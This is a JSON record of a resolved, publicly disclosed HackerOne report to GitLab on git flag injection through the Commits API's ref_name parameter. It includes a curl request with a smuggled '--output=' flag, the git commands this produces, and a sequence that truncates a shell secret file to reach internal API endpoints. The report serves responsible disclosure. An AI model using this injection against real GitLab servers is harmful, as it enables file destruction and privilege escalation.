{
  "id": 653125,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NTMxMjU=",
  "url": "https://hackerone.com/reports/653125",
  "title": "Git flag injection leading to file overwrite and potential remote code execution",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2019-07-22T16:00:17.809Z",
  "submitted_at": "2019-07-22T16:00:17.809Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "vakzz",
    "url": "/vakzz",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWLIXK7KK%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T125800Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCn9dBDjuRnR6R6gwO7wx1V9VTCorPNrsiHfcpQFucMbgIga98tHzwspPe%2FMy%2FsxRSx9minsZ%2FmvaaRCrdbchOwi8MqsgUIFhADGgwwMTM2MTkyNzQ4NDkiDOfrddDnnKJLEaVlcSqPBfc6dsF029BlI%2Bzcy0u3riyL4%2F%2FT8xwtdkFDq1v%2BQabUqM9VNCUvDv7%2FWtv5itm3mLChE%2FgPaggTV0x1i4M9I96rP1Tdx734GZtatA9caD0YziJznRTFhZdv%2BRpZyqW0x%2BDBWmkbnL3q9Mk2VqWGuv8w0WORhVkr4U%2FwRPgCzLAhLmRIBtlGR3Le2jV5izWW%2FiA%2Bf1VF%2F4NRpjSpghXMCMfWFc%2B%2FoHd6Wx8j5FDXlE5MWsh80fs6d%2BW%2BxlwigGZiMnj1JTbOJkwOMap0zEoscOF4D2%2FoN7V6DeI3J7XqFN9oNB8hnPJdHB6tQpL8WGDV1jlfkfiOZPgJl2YRYT3VR%2F6PiV9ep5i7rm%2BRdQSo8dXy%2BfO573cpC4qYbOku4H0hb8Fphn24zLF7xfIRfvxEkjhvCkj6lS6sLM%2FnLqOxjn%2BLpJ%2FlY%2FL%2BBYIuaVPtIRs5qcp9L9UqnSDMtgkM3Mz0z5SWl5HxDRdxvfCCuyKUUNmTVams1QJBlVA%2BdYMt%2ByxelC%2BwpnG1PPTfmEonQn%2FYp4kODNrhsXvXelOeN7kZobZPGu4%2B7bVbNinz2qD%2Br2yCTjvjFqwAFCo9WlKaheGttma8EXZB61nf28NRE4J%2FEJ9WmT3aOBUvHDxbx6npxblNmsoexiEUKtlU6govA%2ByAMHswQidvdg9KEkEKlH4y7tFfmMeqf6iNRhhDz1FSIY98LQeNqswenjrx9ZR7n7kxipXGpSAPqVBcwDdS9tply%2BdNvqgyt5QNcP%2FIbbVHpppKANGqJVb4FpkajI2KOva%2Bixf1meJEdCm5OjL5pPuuGqyVZRw%2FQ8S8uX38e7ftk%2BLHhMhPAdw1R7UxZzic8TTUrGwzA%2FIVMziQ6bSVobTS8Bsw2d6%2FxgY6sQFM%2B90JI1LEO4gKDDWGfro2TDqdvKNUO%2Fvlb3svsloHnDao94fo%2F%2B3Ol%2FaogxtrDavOPVXuINmcNsIMdhE7eJrmttrpl7ilZclTNPMTu10XV8QWwX19%2F0HFf%2BUEVINni3fExXGHohjy3vo40Ac8cmd3D%2FpVgn%2BLhUVMBm9Y1A7EjU59wdGt49wIk9a387%2FWElmuu5RqXQqqrsQ9uelZBSyRqZFNO0jvoeWtkr%2B5%2BBzLIWg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5453edf1f742ec43e8c57d12b9a17541db198f9d01cd5327da8ed26d9d8784e0"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-12-19T00:24:21.076Z",
  "bug_reporter_agreed_on_going_public_at": "2019-10-14T04:10:29.872Z",
  "team_member_agreed_on_going_public_at": "2019-12-19T00:24:20.982Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Summary\nThe `ref_name` in the Commits API is not sanitized, allowing for a ref starting with `--` to be provided causing git to interpret it as a flag instead of as a ref.\n\nIf a `ref_name` such as `--output=/tmp/some_file` is used then the following command is executed by gitaly in `find_commits.go`:\n\n`/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git log --format=format:%H --max-count=20 --follow --output=/tmp/some_file -- .`\n\nfollowed by\n\n`/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git rev-list --count --output=/tmp/some_file -- .`\n\nThis first writes the list of commits to the file, but then the `rev-list` command fails but not before truncating the file.\n\n### Steps to reproduce\n\n1. Create a repo and add a file\n2. Use the commit api and pass in a `ref_name` such as `--output=/tmp/written`:\n\n```\ncurl 'http://4290d4225642/api/v4/projects/5/repository/commits?path=.&ref_name=--output=/tmp/written'\n```\n\n3. See that the file has been created:\n\n```\n# ls -asl /tmp/written\n0 -rw-r--r-- 1 git git 0 Jul 22 14:56 /tmp/written\n```\n\n### Impact\n\nThe bug allows for arbitrary files to be briefly replaced with a known commit (or a list) and then truncated be empty, easily causing denial of service by replacing important files.\n\nOne attack scenario I thought of would be to truncate `/var/opt/gitlab/gitlab-rails/etc/gitlab_shell_secret`, which almost worked but ended up failing due to `authenticate_by_gitlab_shell_token` checking the token with `unauthorized! unless Devise.secure_compare(secret_token, input)` which fails if either are blank.\n\nThis method could potentially still work if a large number of requests were spammed, waiting until the unicorn restarts (eg for an upgrade). So long as a `git log` happens last before the server shuts down then the file will stay with the commit and not get truncated. I was able to reproduce this with around 32 connections then restarting:\n\n```\n# gitlab-ctl restart unicorn\nok: run: unicorn: (pid 46755) 1s\nroot@4290d4225642:/var/opt/gitlab/gitlab-rails/etc# cat gitlab_shell_secret\n████████\n``\n\nThis then allows for use of the internal api:\n```\ncurl -s 'http://4290d4225642/api/v4/internal/check?secret_token=██████████'\n{\"api_version\":\"v4\",\"gitlab_version\":\"12.0.3\",\"gitlab_rev\":\"08a51a9db93\",\"redis\":true}\n\ncurl -s 'http://4290d4225642/api/v4/internal/discover?secret_token=███&user_id=1'\n{\"id\":1,\"name\":\"Administrator\",\"username\":\"root\"}\n```\n\n### What is the current *bug* behavior?\n\nThe `ref_name` is not sanitized\n\n### What is the expected *correct* behavior?\n\nThe `ref_name` should be sanitized to prevent it being used as git command flags.\n\n#### Results of GitLab environment info\n\nSystem information\nSystem:\nCurrent User:\tgit\nUsing RVM:\tno\nRuby Version:\t2.6.3p62\nGem Version:\t2.7.9\nBundler Version:1.17.3\nRake Version:\t12.3.2\nRedis Version:\t3.2.12\nGit Version:\t2.21.0\nSidekiq Version:5.2.7\nGo Version:\tunknown\n\nGitLab information\nVersion:\t12.0.3\nRevision:\t08a51a9db93\nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:\tPostgreSQL\nDB Version:\t10.7\nURL:\t\thttp://4290d4225642\nHTTP Clone URL:\thttp://4290d4225642/some-group/some-project.git\nSSH Clone URL:\tgit@4290d4225642:some-group/some-project.git\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers:\n\nGitLab Shell\nVersion:\t9.3.0\nRepository storage paths:\n- default: \t/var/opt/gitlab/git-data/repositories\nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\nGit:\t\t/opt/gitlab/embedded/bin/git\n\n## Impact\n\nTruncating arbitrary files and potentially replacing them with known content. This can lead to denial of service, loss of important data, and potential privilege escalation.",
  "bounty_amount": "3500.0",
  "formatted_bounty": "$3,500",
  "weakness": {
    "id": 58,
    "name": "Command Injection - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 169,
  "voters": [
    "sky003",
    "n1m0",
    "haxor31337",
    "cinzinga",
    "p1stachios",
    "base_64",
    "ali",
    "stealthy",
    "sameerphad72",
    "tess",
    "and 159 more..."
  ],
  "severity": {
    "rating": "critical",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 18138,
    "asset_type": "URL",
    "asset_identifier": "gitlab.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
